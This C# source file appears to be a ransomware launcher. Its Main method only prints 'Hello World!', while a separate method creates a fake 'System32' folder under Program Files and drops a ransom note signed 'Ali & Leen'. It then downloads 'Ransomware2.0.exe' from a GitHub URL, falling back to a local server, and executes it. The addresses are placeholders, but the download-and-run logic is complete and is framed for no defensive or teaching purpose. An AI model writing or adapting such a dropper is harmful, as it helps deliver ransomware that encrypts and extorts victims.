using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace Lancher {
class Program {
  static void Main(string[] args) {
    Console.WriteLine("Hello World!");
    Console.ReadKey();
  }
  private void lancher() {
    // Create Folder
    Directory.CreateDirectory("C:\\Program Files\\System32");
    // Create text file
    File.WriteAllText("C:\\Program Files\\System32\\README.txt",
                      "You were encrypted by Ali & Leen, good luck...");
    // define path on desktop
    string path_cache =
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

    DownLoadFileInBackground2("URl to github");
    Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
    string existfile = path_cache + @"\._cache_DCQPKX.exe";
  }

  // DownLoadFileInBackground2
  public static void DownLoadFileInBackground2(string address) {

    // Make protocol for donwload file from github
    ServicePointManager.Expect100Continue = true;
    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

    WebClient client = new WebClient();
    Uri uri = new Uri(address);
    // Call DownloadFileCallback2 when the download completes.
    client.DownloadFileCompleted +=
        new AsyncCompletedEventHandler(DownloadFileCallback2);
    // Specify a progress notification handler here ...
    client.DownloadFileAsync(uri,
                             @"C:\Program Files\System32\Ransomware2.0.exe");
  }
  private static void DownloadFileCallback2(object sender,
                                            AsyncCompletedEventArgs e) {
    if (e.Cancelled) {
      Console.WriteLine("File download cancelled.");
      DownLoadLocalFileInBackground();
    }

    if (e.Error != null) {
      Console.WriteLine(e.Error.ToString());
    }
  }
  public static void DownLoadLocalFileInBackground() {

    WebClient webClient = new WebClient();
    webClient.DownloadFile("URl to local server",
                           @"C:\Program Files\System32\Ransomware2.0.exe");
  }
}
}